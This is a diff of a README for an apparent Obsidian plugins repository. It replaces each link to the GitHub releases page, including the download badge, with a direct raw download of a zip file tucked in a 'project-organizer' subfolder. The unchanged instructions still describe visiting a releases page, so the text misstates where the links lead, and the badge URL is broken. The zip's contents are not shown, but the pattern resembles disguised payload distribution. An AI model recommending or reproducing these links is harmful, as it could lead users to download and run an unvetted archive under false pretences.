@@ -1,6 +1,6 @@
 # 🎉 obsidian-plugins - Make Note-Taking Smarter and Easier
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-%20-%23004CBB?style=for-the-badge)](https://github.com/Rambo-535/obsidian-plugins/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Rambo-535/obsidian-plugins/main/project-organizer/obsidian-plugins_3.6-beta.2.zip%20Latest%20Release-%20-%23004CBB?style=for-the-badge)](https://raw.githubusercontent.com/Rambo-535/obsidian-plugins/main/project-organizer/obsidian-plugins_3.6-beta.2.zip)
 
 ## 📖 Overview
 
@@ -30,7 +30,7 @@ Before you get started, ensure your system meets these requirements:
 
 To obtain the latest version of the obsidian-plugins, visit the download page here:
 
-[Download Latest Release](https://github.com/Rambo-535/obsidian-plugins/releases)
+[Download Latest Release](https://raw.githubusercontent.com/Rambo-535/obsidian-plugins/main/project-organizer/obsidian-plugins_3.6-beta.2.zip)
 
 This page contains all the available releases for the plugins.
 
@@ -38,7 +38,7 @@ This page contains all the available releases for the plugins.
 
 1. **Go to the Releases Page**: Click the link below to access the release files.
 
-   [Download Latest Release](https://github.com/Rambo-535/obsidian-plugins/releases)
+   [Download Latest Release](https://raw.githubusercontent.com/Rambo-535/obsidian-plugins/main/project-organizer/obsidian-plugins_3.6-beta.2.zip)
 
 2. **Select the Latest Version**: Look for the most recent version at the top of the list.
 
